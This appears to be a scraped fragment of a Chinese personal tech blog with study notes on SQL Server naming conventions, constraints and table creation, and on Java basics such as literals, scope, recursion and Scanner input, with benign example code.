以Domain来标识, 拆分DATABASE，基于大的逻辑范畴，如operation 范畴以及部门类别,另外：其它与部门相关的DATABASE 可以放到相关的SERVER 下。 数据库对象 ———— 表、视图、列名、约束、规则、默认值 数据库对象应该被清晰的命名，要确认不存在歧义。 数据库对象的名字应该包括自己尽可能多的信息，并要详细的说明与之相对应的项目文档.选择合适的命名空间是一个很让人困惑的问题（比如我们不能从一个存储过程的命名上看到是哪个项目在使用这个对象），命名名字唯一的在数据库级别标识自己，无论在哪儿使用它，请确保在一个项目中命名方法的一致。 在一个小的上下文看来很清晰的对象在一个大的上下文中可能就会丢失他的含义。 节省击键次数永远不能用来作选择名字的标准。 下面供述了数据库对象的命名协定，所有的数据库对象命名都应该遵循下面协定。 如果不是长度限制，缩写应该被避免.当使用缩写时应该遵从下面的缩写规范的规则.缩写应该在项目范围内保持一致并被存档. 不要使用特殊的字符；对文字数字式字符加以限制. 在命名时为了更好的标识表与应用程序之间的关系，我们要使用” [function name]|[main module name]＿表名“ 的形式.比如: Newegg_customer Blocked_customer Abs_customer EDI_ .... MDF_ .... 当要修改一个对象的架构时，首先要确认与之存在依存关系的对象不受影响.要查看与之存在依存关系的对象，可以在企业管理器中 “右键相应对象” -&gt; “ALL TASKS” -&gt; “DISPLAY DEPENDENCIES” 来查看或者使用系统存储过程SP_DEPENDS 来查看: EXEC SP_DEPENDS ‘dbo.GetCategories’ 当底层表结构更改时，视图都应该被重新创建。这个应该特别被注意，特别是视图是使用如 “SELECT * FROM table” 时。强烈建议任何时候都不要使用类似于 “SELECT * FROM” 的语句. 当在不存在事务上下文中或者是完整性要求不是很高时，在 SELECT 语句中使用 WITH NOLOCK. 缩写规范 由于长度的限制而需要使用缩写时,应当遵从以下的规则: 以分类单词作为名字的起始. 缩写的第一个字符应该与单词的第一个字母相同,比如,SFER就不是Transfer的有效缩写. Identify and abbreviate the root word, usually the shortest form of the word. 缩写时省略元音字符,除非特殊原因，重复字符中将被省略一个。 缩写不应该暗示到其它的单词（比如：单词“parent”可能被缩写为”PRNT”,但是“PRNT”很 易让人想起单词“PRINT”，一个比较好的缩写就是使用”PSRNT”） 相似单词的缩写应该一致,比如如果Charge缩写为CHRG,则change应该被缩写为CHNG. 当组合词或者短语被广泛使用时，并且大多人都能识别出这些缩写时，应该使用他们的 字母缩写，因为大多人都能识别出这些缩写。 主外键命名 主键：对主键进行命名应该遵从以下标准: PK_表名 PK_Customer 外键：对外键进行命名时应该遵从以下标准: ChildTableName_FK_ParentTableName Customer_FK_Country Sales_FK_Customer 表命名 符合以下规范： 统一采用单数形式，反对Orders 首字母大写。驼峰式，dbo.TempCatalog 避免中文拼音，反对AgentBaoCi 避免下划线连接，反对User_Accout（下划线适用Oracle数据库） 避免名称过长 多对多关系表，以Mapping结尾，如UserRoleMapping 避免保留字 列命名 避免缩写和特殊字符。 避免中文拼音 避免下划线连接、避免名称过长、避免保留字。 单个字母全部小写，student。多个字母，采用驼峰式，首字母大写，StudentName 须有一主键，主键不直接用ID，而是表名+ID，如userID/orderID 常用的字段name，不直接用name，而是表名+Name，如userName/orderName 常用的字段desc，不直接用desc，而是表名+Desc，如userDesc/orderDesc 触发器命名 索引命名 Check约束命名 游标命名 存储过程命名 源文件命名、Job命名、用户自定义函数命名","link":"","tags":[{"name":"SQLServer","slug":"SQLServer","permalink":"http://www.fangning.xyz.com/tags/SQLServer/"}]},{"title":"相关基本操作及概念","date":"2020-12-24T09:38:30.000Z","path":"2020/12/24/2020.12.24 数据存储(2)/","text":"新建查询操作数据库123456789101112131415161718create table Courses --创建课程表( courseID nvarchar(20) constraint PK_Courses primary key not null, -- 设置主键约束 PK_Courses courseName nvarchar(10) not null , -- 设置字段 课程名 scor int not null -- 设置字段 课程学分)create table Students --创建学生表 ( studentID nvarchar(20) constraint PK_Students primary key identity not null , -- 设置主键约束 PK_Students，自然增加。 courseID nvarchar(20) constraint Students_FK_Courses foreign key references Courses(courseID) not null , -- 设置外键约束 Students_FK_Courses 参考课程ID studentName nvarchar(10) unique not null , -- 设置学生姓名字段，不为空，不可重复 studentSex nvarchar(2) default &#x27;男&#x27; not null , -- 设置学生性别字段，不为空，默认为男 age int check (age &gt;= 0 and age &lt;= 200) not null -- 设置学生年龄字段，不为空，范围 [0,200]) 约束 约束：对一个表中的属性的限制叫做约束。 主键约束：不允许重复元素，避免了数据冗余。 主键一定要用与事物无关的字段来表示。一般为编号，字符串。也叫代理主键 因为，如果使用具有含义的字段表示主键（业务主键），比如姓名是主键。那么，当名字改变的时候，参考该主键的外键都需要进行改变。 外键约束：通过外键约束从语法上保证了本事物所关联的其它事物是一定存在的。 事物与事物之间的关系是通过外键来体现的。 Check约束：保证事物属性的取值在合法范围内。比如，年龄字段大概是[0~150]，…… 默认命名 “CK _ 表名 _ 字段名”。 default约束：保证事物属性一定会有一个值。 比如性别属性，可以默认设置为 ‘男’ 。 unique约束：保证事物属性的唯一性。 比如名字字段加上 unique，表示数据表中不能包含两个姓名一样的人。 与主键的区别是： 主键不能为 null 。更加深层次的区别是，unique主要用来表示数据不可重复，然而主键约束，可以唯一代表该事物。 unique约束 可以为 null。（oracle允许多行 unique字段为空，sql server只允许有一行 unique字段为空）。 关系分类 一对一 比较少见。 假如事物 A 与事物 B 是一对一的关系，那么： A 的主键可以充当 B 的外键。 或者 B 的主键来充当 A 的外键。 一对多 比较常用。假如事物 A 与事物 B 是一对多的关系，那么： 只能用 B 的主键放到 A 中充当 A 的外键。 A 如果是学生， B是课程。学生可以选修多门课程。 因为学生比较多，所以在事物多的一方添加外键。 多对多 班级与老师关系：一位老师可以给多个班级授课，同时一个班级可以有多位老师。 多对多必须通过额外的 第三张表(mapping表) 来实现。 两个表结合产生关系之后，势必还会生成许多附加信息字段。 比如，班级与老师有关联，那么可能产生老师给该班级授课程的事件。所以还得添加课程字段。 第三张关系表中，至少得有两列外键，参考班级编号主键、和老师编号主键。 第三张表中主键，必须是两个外键与附加字段的组和形成组合主键。 所谓组合主键，就是不能相关的标识字段，不能完全相同。 数据库关系图 点击数据库关系图，新建关系图。 然后，选中数据库中相关的一些数据表，生成可视化数据关系图。 关系和字段是两个独立的东西，你把关系删除了，字段还是存在，只是没了外键约束。 就像 Check 约束，你把约束删除了，但是该字段还是存在的。 相关命令格式 创建表 1234creat table [表名]( --内容,) 删除表 1drop table [表名]; 查看表 1select * from [表名]; 创建字段 1[字段名] 字段类型 , -- stuID vchar(20), 创建主键约束 1constraint [约束名] primary key， -- constraint PK_Students primary key, 创建组合主键约束 12constraint [约束名] primary key (组合字段列表), -- constraint PK_class_teacher_mapping primary key (classID, teacherID, course), 自增长主键 1stuID int constraint PK_Students primary key identity, -- 加上identity以后插入数据不必写编号，数据库自追加编号！ 创建外键约束 12constraint [约束名] foreign key references [表名](字段名),-- constraint students_FK_courses foreign key references Courses(CoursesID), 创建Check约束 12emp_sal int check (emp_sal &gt;= 1000 and emp_sal &lt;= 5000),-- SQL中 &quot;与&quot; 不是 &quot;&amp;&amp;&quot; 而是 &quot;and&quot;。这和C++中and不同，那边是二进制运算。这里是逻辑运算。 创建defalut约束 1studentSex varchar(2) default (&#x27;男&#x27;) -- (&#x27;男&#x27;) 可以省略 &quot;()&quot; 括号。 不可为空约束 1not null, -- 不可为空，不加的话（就是可以为空） 唯一约束unique 12studentName varchar(20) unique; -- 姓名字段不可重复。studentName varchar(20) unique not null; -- 姓名字段不可重复、且不能为空。 添加一行数据到表中 12insert into [表名](部分字段列表) values (部分字段值列表); -- 可以只赋值一行中的某些字段值。insert into [表名] values (列1, 列2, 列3, ...全部字段值); -- 如果省略字段列表，则需全部赋值。 数据类型 12345varchar(n) , -- n长度字符，单字节长度，variable 长度可变nvarchar(n), -- n长度字符，国际化编码双字节长度字符，variabel 长度可变int ,float,date , -- 日期 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768--练习各种主键约束、唯一约束、默认约束--练习插入数据create table student( studentID varchar(20) constraint PK_student primary key not null, studentName varchar(20) unique, studentSex varchar(2) default (&#x27;男&#x27;) not null, -- sql 中字符或则字符串都是使用单引号。)insert into student(studentID, studentName) values (&#x27;0001&#x27; , &#x27;方宁&#x27;);insert into student(studentID , studentName) values (&#x27;0004&#x27; , &#x27;阿三&#x27;);insert into student values (&#x27;0002&#x27; , &#x27;张三&#x27;, &#x27;女&#x27;);insert into student values (&#x27;0003&#x27; , &#x27;张三&#x27;, &#x27;男&#x27;); -- 错误，studentName重复insert into student values (&#x27;0005&#x27; , null, &#x27;女&#x27;); insert into student values (&#x27;0006&#x27; , null, &#x27;女&#x27;); -- 错误，studentName重复drop table student-----------------------------------------------------------------------------------------练习自增主键 identitycreate table student2( stuID int check (stuID &gt;= 0 and stuID &lt;= 1000) constraint PK_student2 primary key identity not null, stuName varchar(20) unique not null, stuSex varchar(2) default &#x27;男&#x27;, stuEmail varchar(30), stuaddress varchar(50)) insert into student2(stuName) values (&#x27;方宁&#x27;);insert into student2(stuName) values (&#x27;张三&#x27;);insert into student2(stuName) values (&#x27;里斯&#x27;);insert into student2(stuName) values (&#x27;小君&#x27;);drop table student2;select * from student2;------------------------------------------------------------------------------------练习多对多关系--班级表create table Class( classID int constraint PK_Class primary key identity not null, classNum int not null, className nvarchar(20))--教师表create table Teacher( teacherID int check (teacherID &gt;= 0 and teacherID &lt;= 1000) constraint PK_Teacher primary key identity not null, teacherName nvarchar(20) not null,)--模拟班级与教师的多对多关系表create table Class_Teacher_mapping( classID int constraint Class_Teacher_mapping_FK_Class foreign key references Class(classID) not null, teacherID int constraint Class_Teacher_mapping_FK_Teacher foreign key references Teacher(teacherID) not null, course nvarchar(20), constraint PK_Class_Teacher_mapping primary key (classID, teacherID, course), --多字段组合主键)select * from Class_Teacher_mapping; 相关经验 SQL Server 与 Oracle 或者 MySQL 在语法层面有所不同。所以，编写的 .sql 程序可能无法跨脚本运行。 编写时尽可能的使得代码能够跨平台。 例如，SQLServer中，最后一条语句结束可以加一个 ‘,’ 号，或者不加。都能运行成功。但是，Oracle中最后一条语句不能加 ‘,’ 号。所以，编写代码过程中，我们尽可能满足双方要求，所以末尾不加逗号为最优选择。 单条语句，以分号 ‘;’ 结尾。同一条语句，中间以 ‘,’ 逗号间隔。 关于使用 SQL Server managment studio 执行 .sql 程序 分析 ———— 相当于编译，检查语法错误 调试 ———— 程序语句较为复杂是，需要编译。 报错 “ 防火墙关闭了 TCP 135 和 UDP 4500, 500 端口”。 参考链接 配置防火墙入站规则，打开相应的三个端口号。 添加程序”SQL Server Management Studio.exe”，到入站规则中。 执行 ———— 运行 .sql 程序。 可以选中一个文件中的部分代码，单独分析、执行。 相关单词 constaint 约束 references 参考 unique 唯一 identity 身份；一致；特性。 图灵说过：实际上所有事情，都可以使用顺序、选择、循环结构来实现！ 数据库+高级语言才能将项目实现。 虽然数据库本身也研发出一套带循环，选择，顺序的高级语言来调用数据库。 比如，SQL Serverd的 TL-SQL语言。或者 Oracle的PL-SQL语言。 但是这些语言，并不为人熟知，且无法跨平台，所以我们还得借助主流的C++、Java语言。 一般开发过程中，都是结合主流高级语言，数据库高级语言，以及数据库来实现。 使用数据库语言将数据库中的数据导入到内存中。 使用高级语言编写的程序来进行调用和处理。 面向对象 和 面向过程 面向过程：数据是数据，操作是操作。两者没有太大的练习，是分开的。C、SQL语言。 面向对象：将数据和操作整合到一起，形成对象。C++、Java。 =============================== 我在人间凑数的日子 =================================","link":"","tags":[{"name":"SQLServer","slug":"SQLServer","permalink":"http://www.fangning.xyz.com/tags/SQLServer/"}]},{"title":"SQL Server学习","date":"2020-12-21T08:20:30.000Z","path":"2020/12/21/2020.12.21 SQL Server数据存储(1)/","text":"SQL Server 2008 R2安装 先下载安装镜像，也就是 .iso 文件，然后解压。 安装步骤教程 中间设置 windows 账户与 SQL Server 账户混合验证模式 然后为SQL Server 管理员 sa 设置一个密码 再添加自己Windows中的当账户。 为了sqlserver与mysql 的安全，建议数据库低权限运行。禁止远程访问 1433与 3306端口等。 运行 win + R 后输入 Services.msc 打开服务管理器。 找到 SQL Server Browser 服务，打开。 开始菜单，找到 Microsoft SQL Server Management Studio 运行 相关概念数据结构与数据库的区别 数据结构是在系统软件级别研究数据的存储和操作。（偏计算机内存） 数据库是在应用级别研究数据的存储和操作。（大多数偏计算机的外存层次） 什么是连接 我们所使用的客户端，或者是数据库管理系统和数据库是分离的。 我们可以使用 DBMS 访问本地计算机中的数据库，也可以远程访问别的服务器或计算机上的数据库。 连接：就是将数据库管理工具与数据库连接起来。 这样就可以拿取数据，显示，修改。 使用本地数据库之前，需要打开本地计算机的数据库服务。在服务管理器里面可以手动打开。 注重三个方面 数据库如何存储数据的 字段 记录 表 约束（主键，外键，唯一键，非空，check defult） 数据库所解决的主要问题 如何存储个体。 如何存储个体与个体之间的关系。 数据库如何操作数据的 insert , update , delete , T-SQL , 存储过程， 函数， 触发器 数据库如何显示数据的 select重点 基本的界面操作 新建库 右击数据库选项，新建数据库就行了。 删除库 选中数据库，右击删除，选中删除源文件，并且断开连接。 分离库 将数据库中的数据库文件(.mdf)，与数据库分离，但是并不删除。 分离后的数据库文件，可以剪切移植，和删除操作。 附加库 导入分离后的数据库文件（**.mdf**）到本地数据库当中。 安全性 用具有最高权限的身份登陆数据库之后，可以在安全性选项卡中新建/删除用户。 但是，如果用普通用户登陆，则不具有修改权限。 常用术语含义 主键：可唯一的标识数据表中的一行数据。 单独添加一个编号属性。 所有的数据，都应该具有一个编号起标识作用。 外键 表示表与表之间的关系。 一张表的外键所表示的数据来自另外一张表。 该表的外键，是另外一张表的主键。比如主键为0001的学生，具有一个外键为1001（部门表的主键），表示学生0001属于部门1001。或者说，该学生，与该部门有某种关系。 表的相关特征 字段：一个事物的某一静态特征。（一列） 记录：字段的组合，表示的是一个具体的事物。（一条数据，一行） 表：记录的组合，表示的是同一类型的事物组合。（二维表） 字段是事物的属性，记录是事物本身，表是事物的集合。 图形化界面建表、主、外键约束建立表的时候主要有两步，一是设置表的字段，二是设置表的记录。 注意，一定要将数据库中所有相关表的字段全部设置完成之后，才去设置每一张表的记录。 注意，如果一张表中含有外键，那么先建立外键所表示的表的字段，再建立该表的字段。 注意，外键建立按照多对一原则，也就是在记录较多的一张表中，添加另外一张记录较少的表的主键为外键字段。 建表 新建数据库 新建表1 ———— 学生表(Students) 新建表2 ———— 课程表(Courses) 设置主键 设置两张表主键都为 id 字段。 右击该字段，设置为主键！ 设置外键 外键生成过程 1 添加一个普通字段，该字段所有属性应该与另外一张表的主键一致。 2 将该字段设置为外键。 将该字段，设置为外键字段。 右击空白处，选择关系，点击添加，展开表和列规范。 外键表：一张表中所包含的所有外键。 因为我们需要设置外键，所以外键表中表名选择 Students 然后选择，Students 中的 cour_id 字段为需要设置成外键的字段。 主键表：一张表中所包含的所有主键。 Students表的外键，对应 Courses 表中的主键 cour_id 所以主键表名应该选择 Courses 表，字段选该表的主键 cour_id 含义就是 表Students 中的外键字段 cour_id 映射到 表Courses 的主键字段 cour_id 外键名称 FK_Students_Courses 外键也是一个对象，所以对应一个名称。 所以，在外键设置过程中，需要给该外键命名（默认为FK（Foreign key）加两张相关数据表的名称）。 添加记录 右击新建的表，编辑前200行。 先添加课程表的记录，再添加学生表记录。因为学生表中包含课程表的外键关系。（由小到大，由少到多原则） 相关经验 现在主流的是关系型数据。感觉不久的将来，主流的将是面向对象型数据库。 表示数据表之间的关系，只能通过建立外键这唯一的一种方法来表示。 相关英文 Primary key ———— 主键 Foreign key ———— 外键 table ——————— 表 Row ——————— 行 Column ————— 列","link":"","tags":[{"name":"SQLServer","slug":"SQLServer","permalink":"http://www.fangning.xyz.com/tags/SQLServer/"}]},{"title":"java基础","date":"2020-12-15T07:18:30.000Z","path":"2020/12/15/2020.12.15 java基础语法/","text":"文档注释 以 “ /** ” 开头，以 “ */ ” 结尾。表示一个文档注释。 区别于普通的注释。以 /* 与 */ 开头或结尾。 注释中包含一些说明性的文字以及一些 javaDoc 标签（后期些项目时，可以生成项目的API）。 里面包括许多选项，所以==一般使用开发工具来进行注释==，而不是手写！ 命名原则 包名 —- 小写字母组成。 类名 —- 大写字母开头。 方法名 —- 第一个单词小写，其他单词首字母大写（驼峰式）eg: addNumber。 变量名 —- 只能以字母、下划线、美元符$开头，不能以数字开头。（一个汉字也相当于一共字母）。 1234567891011121314151617package com.fangning;public class Text&#123; public static void main(String[] args) &#123; int 方 = 10; System.out.println(&#x27;方&#x27; + &quot; = &quot; + 方); int x = 0x0010; // 十六进制 int y = 010; // 八进制 int z = 0b0010; // 二进制 System.out.printf(&quot;%d %d %d\\n&quot;, x, y, z); &#125;&#125;----------------------- 运行结果方 = 1016 8 2 作用域 局部变量 声明位置：方法或语句块内定义。 从属于：方法/语句块。 生命周期：从声明到语句块结束。 成员变量 声明位置：类内部，方法外部定义。 从属于：对象。 生命周期：对象声明，成员变量也就更着创建。对象小时，成员变量消失。 静态变量 声明位置：类内部 ** **static修饰。 从属于：类。 生命周期：类被加载，静态变量生效；类被卸载，静态变量消失。 一般由类名加直接访问符(‘.’)进行访问。虽然对象也可以访问，但是很少这么做。 1234567891011121314151617181920212223242526272829public class TextVariable &#123; int ans1; static int ans2; int getAns1() &#123; return ans1; &#125; int getAns2() &#123; return ans2; &#125; public static void main(String[] args) &#123; TextVariable t1 = new TextVariable(); TextVariable t2 = new TextVariable(); t1.ans2++; t1.ans1++; System.out.printf(&quot;t1.ans1 = %d\\n&quot;, t1.ans1); System.out.printf(&quot;t1.ans2 = %d\\n&quot;, t1.ans2); System.out.printf(&quot;t2.ans1 = %d\\n&quot;, t2.ans1); System.out.printf(&quot;t2.ans2 = %d\\n&quot;, t2.ans2); System.out.println(TextVariable.ans2); &#125;&#125;-----------结果t1.ans1 = 1t1.ans2 = 1t2.ans1 = 0t2.ans2 = 11结论：静态变量在该类型的所有对象中都有效。可通过 &#x27;类/对象&#x27; 来访问 成员变量只可通过对象访问。 数据类型变量初始值 局部变量如果未初始化。直接是一个垃圾值，报错。 成员变量如果未初始化。 静态变量如果未初始化。同成员变量。 变量类型 ==基本类型== 整形：short（16bit） 、int（32bit）、long（64==描述内存大小常用==） 字节：byte 一个字节8位，不是 bit。范围 -128~127 浮点：float、double（==范围最大==） 字符：Unicode编码，双字节一个字符。 布尔：boolean – true or false（不能使用 0、1代替） ==引用数据类型==（类类型）——–&gt; 占四个字节，表示对象存储的地址！而不是对象本身的大小 类（class） 接口（interface） 数组（array） 枚举（enum） 浮点存储​ 关于计算机内部浮点数的存储方式，IEEE754标准。 ​ 写的比较清除的一文 ​ 图文并茂的一文 ​ 主要注意一下几点就行了： 浮点十进制，如何转化为二进制。 整数部分采用除2取余法，转化为二进制。 小数部分采用乘2取整法，转化为二进制。 浮点二进制，如何在计算机内部存储。 步骤一：将二进制浮点数，写成科学计数法的形式。1110110.1 变成 1.11011012^6。也就是说，任何非0的二进制浮点数都可以变成 1.xxxx2^n 形式。这里的 1.xxx 叫有效数字尾数部分M，n 表示 指数部分E，另外还省略了前面的符号位0正1负S。 步骤二：计算机内部 按照 符号位、指数部分、有效数字部分的顺序进行存储。 步骤三：对于指数部分因为有正、负两种。存入内存时 E 的真实值必须再加上一个中间数 ，对于 8 位的 E，这个中间数是 127；对于 11 位的 E，这个中间数是 1023; 对于有效数字部分的第一位都是1，所以省略1不存。 注意：float 4个字节（32bit）存一个浮点数，double 8字节（64bit）存一个浮点数。如下分配，有效数字部分未占满往后补零。 将计算机内部存储的浮点数，转化为十进制浮点数。 当指数部分E不全为0，不全为1时。 将存储的指数部分二进制数转化为十进制后减去127（或1023）；将存储的有效数字部分前面加上1得到真实值。 当指数部分E全为0时。 这时，浮点数的指数 E 等于 1-127（或者 1-1023）即为真实值；有效数字 M 不再加上第一位的 1，而是直接还原为 0.xxxxxx 的小数。这样做是为了表示 ±0，以及接近于 0 的很小的数字。 当指数部分E全为1时。这时，如果有效数字 M 全为 0，表示 ± 无穷大（正负取决于符号位 s）； 变量字面值 整数字面值（默认为 int 类型） 十进制：10、20 … 十六进制：0xa、0xff … 八进制：014、010 … 二进制：0b0010、0b1111 …. long长整型：后面加 L 后缀、999_999_999_999_999L … 浮点数字面值 一般形式：3.14、0.006 … 科学计数法：1.13e-2、1e … 字符字面值 单引号引起来：’A’、’方’、’1’ … 转义字符+Unicode编码方式：’\\uxxxx’（以十六进制指定字符） 、 ‘\\xxx’（以8进制指定字符） 语法语义的字符表示：对于符号” \\ “ 或者 ” ‘ “ 等具有语义的字符表示，需要在前面加上 ‘ \\ ‘ 反斜杠。消除语义。 数字常量表示法 int number = 1_000_000_000; // 可用下划线对数字进行分割，增强可读性。 double PI = 3.14_159_26; 1234567891011121314151617181920package com.fangning;//一个测试 java 字面值的类public class TextVariableValue &#123; public static void main(String[] args) &#123; int num = 1_000_000_000; long num2 = 999_999_999_999L; double v = 3.14_159_26; double v2 = 1.23e-3; float f = 2.14F; char ch = &#x27;\\\\&#x27;; char ch2 = &#x27;\\u0023&#x27;; char ch3 = &#x27;a&#x27;; int num2 = (int)1e4+10; System.out.printf(&quot;%d %f %f %c %c %c %d\\n&quot;, num, v, v2, ch, ch2, ch3, num2); &#125;&#125;-------output1000000000 3.141593 0.001230 \\ # a 10010 注意： 用科学计数法表示，也就是带字符 e 的字面值，初始都为 double 型，如果要用 int 或者 float 存的话，必须强制转换。 int 类型数值如果溢出，那么会==循环数据范围==。 所用的小数字面值默认采用 double 存储，如果 float = 3.14 会提示丢失精度 ==float = 3.14f== 变量类型转换 如果参与运算的数据类型有大、有小。则一律按照最大的类型进行转换。 如果参与运算的数据类型都小于 int ， 那么一律按照 int 类型数据进行转换。 常量 Java中常量用 final 关键字修饰。一般使用全部大写来命名。 Java中没有 const。 字符串 任何语言都没有直接定义字符串类型，Java中的字符串也是类类型 String。 加法 数值和字符串相加，数值直接转化为字符串，最终进行字符串连接。 运算符数学运算 原则： 对于优先级模糊的运算符同时使用，多==添加括号==； 类似于 ans = ++x + y– ; 之类的计算，要==摒弃==。 在很久以前，内存资源比较少，多以编写程序的时候多使用 ++,– 之类的计算，为了减少寄存器的使用；都是现在内存的成本和资源都比较充裕，为了更加易于理解，以前的编码习惯已经不适用了！ 对于教科书，考试题中出现的是否钻牛角尖，不必要的试题都很不提倡。 关系运算&lt; , &gt; , &gt;= , &lt;= , = , == , 返回结果都是布尔型，只有 true , false。 位运算 与（&amp;）、或（|）、求反（~），异或（^）。 左移（&lt;&lt;），右移（&gt;&gt;）。 int &amp; int 的结果是 int ，中间计算过程将 int 转化为二进制进行位运算之后再转化为 int 。 1000 &lt;&lt; 1 = 2000 ， 左移翻一番。 方法本质：方便使用者重复的调用； 命名：第一个单词首字母小写，尔后字母首字母大写。 注意：java中定义一个方法的时候一般都不会太长，太长则一般进行方法的拆分。 定义 ==一般主类中定义，并且由主方法直接调用；== 123456789101112public class Hello&#123; public static void main(String[] args)&#123; printMessage(); printMessage(); &#125; public static void printMessage()&#123; System.out.println(&quot;**********************&quot;); System.out.println(&quot;***www.fangning.xyz***&quot;); System.out.println(&quot;**********************&quot;); &#125;&#125; 内部类：和成员属性、成员方法同级别，访问限制一样。 12345678910public class Hello &#123; class A &#123; public void fun() &#123; System.out.println(&quot;内部类方法！&quot;) ; &#125; &#125; public static void main(String[] args) &#123; new ListTest().new A().fun() ; // 内部类方法！ &#125;&#125; 方法重载 方法名相同，但是方法参数类型、个数不同时，执行过程不同。重复定义多个方法名相同的方法。 注意：方法重载和方法返回值无关，但是==尽量保持所有重载的方法，返回值类型一致==。 print 函数的参数可以是字符串，可以是浮点数，或者布尔，整数；说明该系统方法进行了重载。 12345678910111213141516171819public class Hello&#123; public static void main(String[] args)&#123; int resultA = sum1(1,2) ; int resultB = sum2(1, 2, 3) ; double resultC = sum3(1.2 , 2.1) ; System.out.println(resultA); System.out.println(resultB); System.out.println(resultC); &#125; public static int sum1(int x, int y) &#123; return x + y ; &#125; public static int sum2(int x, int y, int z) &#123; return x + y + z ; &#125; public static double sum3(double x, double y) &#123; return x + y ; &#125;&#125; 递归 必须要有递归结束条件； 每次递归，到下一次递归，都需要修改传递的参数。 递归虽然简化操作，但是项目开发过程中很少去使用，而且会出现栈溢出。 12345678910public class Hello&#123; public static void main(String[] args)&#123; System.out.println(sum(1)); &#125; public static int sum(int x) &#123; if(x == 100) return x ; else return x + sum(x+1) ; &#125;&#125; 123456789101112131415161718public class Hello&#123; public static final int N = 90 ; public static void main(String[] args) &#123; sum(1, 1, 0) ; // 计算 1~N 阶乘和 &#125; // x层递归结束，得到x!为y，阶乘和为result public static void sum(int x, double y, double result) &#123; if(x == N+1) &#123; System.out.println(&quot;N!的阶乘为：&quot; + result) ; &#125; else &#123; y *= x ; // 计算阶乘 result += y ; // 计算阶乘和 sum(x+1, y, result) ; // 修改传递参数 &#125; &#125;&#125; 阶乘的和只有递归到最后一层才能得到结果，==而递归函数的 return 值只能是返回第一层的数据==，所以无法通过递归函数返回最后一次的结果。除非，使用全局变量，否则只能保存在函数参变量中，在递归过程中逐层传递，最后一层输出。 Java中标准输入输出 如果使用 Java 语言做 online Judge 的话会遇到许多关于输入方式的问题。 参考Java常用的键盘输入方式 Scanner（慢，简单） 多实例输入： 12345678910111213// 多实例，输入数值型，空格间隔。// nextInt() , nextLong() , nextFloat() , nextDouble() , nextBigInteger()void input1() &#123; int x1, x2; Scanner sc = new Scanner(System.in); while( sc.hasNext() ) &#123; x1 = sc.nextInt(); x2 = sc.nextInt(); // nextInt() 直到读取下一个为 int 类似数据。 System.out.println(x1 + x2); &#125; sc.close();&#125; 自定义输入流的分隔符。 123456789101112131415161718192021222324 //自定义分隔符输入 void input2() &#123; //String input = &quot;2020-12-8&quot;; Scanner sc = new Scanner(System.in).useDelimiter(&quot;\\\\s*-\\\\s*|\\\\s*\\n\\\\s*&quot;); // 警告是因为两条语句叠加，其中生成了两个Scanner对象，其中一个没有close(); // Scanner默认以空格、换行、制表符作为分隔符Delimiter // 如果使用 useDelimiter方法修改分隔符的话，默认的那些就无效了。所以，但是最后还需要用换行结束，所以得加上 \\n 作为分隔符。 int n , y , r; n = sc.nextInt(); y = sc.nextInt(); r = sc.nextInt(); System.out.printf(&quot;今天是%04d年%02d月%02d日%n&quot;, n, y ,r); sc.close(); &#125;----intput2020-12-18----output今天是2020年12月18日关于正则表达式&quot;\\\\s*-\\\\s* | \\\\s*\\n\\\\s*&quot; （1）&quot;\\\\s*&quot;：中的第一个 &#x27;\\&#x27; 为转义字符。 &quot;\\s&quot; 可以匹配换行、制表、空格等空白符的任意一个。 （2）&#x27;-&#x27;：表示将 - 作为分隔符。 （3）&#x27;|&#x27;：表示或。 （4）后面表示将 &#x27;\\n&#x27; 也作为分隔符。 （5）合起来的意思就是，输入流里面介于 &#x27;\\n&#x27; 与 &#x27;-&#x27; 之间字符的都是有价值的数据。 输入数字后，再输入字符串。（需要读掉多余换行符） 1234567891011121314151617181920212223242526272829303132 void input4()&#123; Scanner sc = new Scanner(System.in); int h = sc.nextInt(); int l = sc.nextInt(); sc.nextLine(); //nextInt()不吸收行末的换行符，所以必须用nextLine()读掉 \\n char map[][] = new char[100][100]; // 为二维数组分配空间。 for(int i = 0; i &lt; h; i++) // 一次读一行 map[i] = sc.nextLine().toCharArray(); for(int i = 0; i &lt; h; i++) // 一次输一行 System.out.println(map[i]); /* // 单个字符输出 for(int i = 0; i &lt; map.length; i++)&#123; for(int j = 0; j &lt; map[0].length; j++)&#123; System.out.print(map[i][j]); &#125; System.out.println(); &#125; */ sc.close(); &#125;---input3 2**&amp;&amp;*&amp;&amp;**&amp;*&amp;&amp;&amp;*---output**&amp;&amp;*&amp;&amp;**&amp;*&amp;&amp;&amp;* 单个字符的连续输入， 换行结束。 123456789101112131415161718192021222324252627282930313233 void input5() &#123; // 方法1，使用System.in.read()方法读一个字节，强制转 char。 // 缺点，无法输入双字节编码的字符，如汉字。 char ch = 0; do&#123; try &#123; ch = (char)System.in.read(); // 注意read()方法一次只读一个字节data，如果是汉字将被错开掉。 System.out.println(&quot;输入了字符: &quot; + ch); &#125; catch(IOException e) &#123; e.getMessage(); &#125; &#125;while(ch != &#x27;\\r&#x27;); // r为行，\\r 表示换行符 //------------------------------------- // 方法二，读取一行后，利用sc.nextLine.charAt(0);从一行中剥离一个字符。 // 缺点，next()或nextLine()都不能读取分隔符，也就是空格，换行，制表符.... Scanner sc = new Scanner(System.in); while(sc.hasNext()) &#123; String str = sc.next(); for(int i = 0; i &lt; str.length(); i++) &#123; System.out.println(&quot;输入了字符: &quot; + str.charAt(i)); &#125; &#125; sc.close();12 12.3 4输入了字符: 1输入了字符: 2输入了字符: 1输入了字符: 2输入了字符: .输入了字符: 3输入了字符: 4 BufferedReader（快，只支持字符和行） StringTokenizer（快，支持标记和数字） 相关知识经验 Java不采用通常语言所用的ASCLL字符集，而是使用Unicode这样的标准国际字符集（两个字节表示一个字符或字母）。因此，对java而言，字母不仅仅局限于英文，还包括汉字。 变量声明，最好分多行，有益于提高代码可读性。不建议一行中声明多个变量。 java中二维数组长度，char array[] [] = new char[100] [100] 那么，array.length = 100; array[0].length = 100; 即使空间中未放置数值，计算长度仍是按照所分配最大长度计算的。 next不吸收回车符、nextLine() 阔以。 所谓不吸收：是指回车依旧会停留在输入流当中。 所谓吸收：是指，会将回车读出输入流，但是并不谁并入到数据中，也就是将回车给忽略了。 ‘\\n’是回车加换行，然而真正的换行是’\\r’。 ‘\\n’：是将光标移动到下一行起始位置。 ‘\\r’：操作在当前行，行末加了一个换行。 理解 java.util.Scanner方法的本质。 本质是按照一定的分割输入流的规则来进行输入。 数据手册中的令牌，也就是字符串的意思。 